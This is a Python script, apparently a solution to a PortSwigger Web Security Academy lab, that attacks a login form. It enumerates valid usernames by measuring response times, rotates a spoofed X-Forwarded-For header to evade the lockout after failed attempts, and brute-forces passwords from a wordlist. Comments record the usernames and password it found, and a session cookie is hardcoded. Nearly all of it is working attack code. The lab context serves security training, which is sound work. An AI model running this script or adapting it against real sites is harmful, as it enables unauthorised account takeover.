import requests
import random

DOMAIN = "0a2900c1034e3f298065b71000cf0052.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=JjnyPaEUEOB6nwR9nJUcxQORMhofFqsZ",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers",
    "X-Forwarded-For": "123.123.123.123"

}

with open("../usernames.dic", "r") as file:
    usernames = file.readlines()

with open("../passwords.dic", "r") as file:
    passwords = file.readlines()


def random_ip_generator():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    HEADERS["X-Forwarded-For"] = random_ip_generator()

    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data)

    if "You have made too many incorrect login attempts. Please try again in 30 minute" in response.text:
        print(f"You have made too many incorrect login attempts. Please try again in 30 minute {HEADERS['User-Agent']}")

    return response

def login_timing_attack():
    for username in usernames:
        password = "a" * 20
        response = login(username.strip(), password.strip())

        print(f"Total time for {username.strip()} is {response.elapsed.total_seconds()}")


def brute_force_password(username):
    for password in passwords:
        response = login(username.strip(), password.strip())

        if "Your username is:" in response.text:
            print(f"Password for {username.strip()} is {password.strip()}")
            break

        print(f"Total time for {username.strip()} is {response.elapsed.total_seconds()}")


# print(login("wiener", "wiener").elapsed.total_seconds())
# print(login("wiener", "peter").elapsed.total_seconds())
# login_timing_attack() # atlas, austin  | the most time elapsed condidates
brute_force_password("austin") # amanda